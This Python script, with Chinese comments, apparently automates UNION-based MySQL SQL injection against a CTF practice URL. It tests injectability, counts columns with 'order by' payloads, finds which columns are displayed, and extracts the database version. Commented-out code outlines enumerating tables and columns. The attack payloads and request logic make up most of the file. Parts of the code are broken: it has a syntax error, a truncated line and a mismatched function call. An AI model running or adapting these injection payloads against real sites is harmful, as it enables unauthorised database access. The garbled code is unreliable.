import requests       # 发送数据包
import re
from optparse import OptionParser        # 传递参数

def get_html(url, params=None, encoding=None):
    try:
        if params is None:
            r = requests.get(url, timeout=30)
        else:
            r = requests.get(url, params=params, timeout=30)
        r.raise_for_status()
        if encoding is None:
            r.encoding = r.apparent_encoding
        else:
            r.encoding = encoding
        return r
    except Exception as e:
        print('there is a problem in get_html!')
        print(e)


def is_injectable(url, methods):
    '''
    Mysql injection test
    '''
    target = url
    for method in methods:
        if 'error' in method:
            injectable = True if 'arning' in get_html(target).text
                else False
        if 'bool' in method:
            p1 =target '+where+2333=2333+--+'
            p2 =target + '+where+2333=2334+--+'
            injectable =  True if get_html(p1).conten


def get_colu_num(url, encoding=None):
    # get the number of columns
    for i in range(1,25):
        try:
            inject_str = "+order+by+{0}--+".format(i)
            request_url = url + inject_str
            r = get_html(request_url, encoding)
            if 'Warning' in r.text:
                print("get the number of the columns:{0}".format(i-1))
                return i-1
        except:
            continue

def get_num_str(colu_num, encoding=None):
    num_str = ','.join((str(i) for i in range(1, colu_num+1)))
    return num_str

def get_visible_colu(url, colu_num, encoding=None):
    num_str = get_num_str(colu_num)
    target_str = 'tHiSisAteXTstring'
    visible_colus = []
    for i in range(1, colu_num+1):
        try:
            test_str = num_str.replace(str(i), "'{0}'".format(target_str), 1)
            inject_str = '+union+select+' + test_str + '--+'
            request_url = url + inject_str
            r = get_html(request_url, encoding)
            if target_str in r.text:
                visible_colus.append(i)
        except Exception as e:
            print('')
            print(e)
    print(visible_colus)
    return visible_colus

def get_version(url, colu_num, visible_colus, encoding=None):
    n = visible_colus[0]
    num_str = get_num_str(colu_num)
    test_str = num_str.replace(str(n), 'version()')
    inject_str = '+union+select+' + test_str + '--+'
    request_url = url + inject_str
    r = get_html(request_url, encoding)
    return r

def get_info(url):
    encoding = get_html(url).encoding
    if is_injectable(url):
        colu_num = get_colu_num(url, encoding)
        visible_colus = get_visible_colu(url, colu_num, encoding)
        version_r = get_version(url, colu_num, visible_colus, encoding)
        print(version_r.text)
    else:
        print("The target url may not be injectable.")


def show_info():
    pass



def main(test_url):
    '''
    main function
    '''

    # Parse command line options
    parser = OptionParser()
    parser.add_option("-u", "--url", dest='url', help=u'目标url', action='store')
    parser.add_option("-d", "--database", dest='database', help=u'列指定数据库中所有表名', action='store', default='all')
    parser.add_option("-t", "--table", dest='table', help=u'列出表中的所有列名', action='store', default='all')
    (options, _) = parser.parse_args()

    if options.url is not None:
        get_info(options.url)
    else:
        get_info(test_url)

if __name__ == '__main__':
    test_url = "http://ctf5.shiyanbar.com/8/index.php?id=1"
    main(test_url)

    # Start the injection
    # if options.url is not None:
    #     # if the http protocol was not specified, exit and print error information.
    #     protocolOne = 'http'
    #     protocolTwo = 'https'
    #     if (protocolOne not in options.url) and (protocolTwo not in options.url):
    #         print('Please specified the HTTP protocol(http or https)!')
    #         exit(0)
    #
    #     # show columns name in the specific table
    #     if options.database is not None and options.table is not None:
    #         scan = 'line'
    #         foo = options.database
    #         fooo = options.table
    #         show_info(options.url, scan, foo, fooo)
    #     # show table name in the specific database
    #     elif options.database is not None
    #         scan = 'table'
    #         foo = options.database
    #         fooo = ''
    #         show_info(options.url, scan, foo)
    #     # show mysql version information in the specific site
    #     else:
    #         show_version(options.url)
    # else:
    #     parser.print_help()

# test_url = "http://ctf5.shiyanbar.com/8/index.php?id=1"
